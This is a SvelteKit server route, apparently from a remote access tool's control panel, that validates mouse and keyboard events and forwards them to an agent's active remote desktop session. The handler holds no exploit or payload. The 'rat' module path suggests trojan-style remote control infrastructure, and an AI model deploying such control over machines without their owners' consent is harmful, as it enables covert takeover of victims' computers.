import { error, json } from '@sveltejs/kit';
import { remoteDesktopManager } from '$lib/server/rat/remote-desktop';
import type { RequestHandler } from './$types';
import { sanitizeInputEvents, type RawInputEvent } from '$lib/server/rat/remote-desktop-input';
import { decode } from '@msgpack/msgpack';

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Agent identifier is required');
	}

	let payload: Record<string, unknown>;
	try {
		const contentType = request.headers.get('content-type') || '';
		if (contentType.includes('application/msgpack')) {
			const buffer = await request.arrayBuffer();
			payload = decode(buffer) as Record<string, unknown>;
		} else {
			payload = (await request.json()) as Record<string, unknown>;
		}
	} catch {
		throw error(400, 'Invalid input payload');
	}

	const sessionId = typeof payload.sessionId === 'string' ? payload.sessionId.trim() : '';
	if (!sessionId) {
		throw error(400, 'Session identifier is required');
	}

	const eventsRaw = Array.isArray(payload.events) ? (payload.events as RawInputEvent[]) : [];
	if (eventsRaw.length === 0) {
		throw error(400, 'No input events provided');
	}

	const session = remoteDesktopManager.getSessionState(id);
	if (!session || !session.active || session.sessionId !== sessionId) {
		throw error(404, 'No active remote desktop session');
	}

	const allowMouse = session.settings.mouse === true;
	const allowKeyboard = session.settings.keyboard === true;

	const sanitized = sanitizeInputEvents(eventsRaw, allowMouse, allowKeyboard);

	if (sanitized.length === 0) {
		return json({ accepted: false, reason: 'filtered' });
	}

	try {
		const result = remoteDesktopManager.dispatchInput(id, session.sessionId, sanitized);
		return json({
			accepted: true,
			count: sanitized.length,
			delivered: result.delivered,
			sequence: result.sequence ?? undefined
		});
	} catch {
		throw error(500, 'Failed to dispatch remote desktop input command');
	}
};
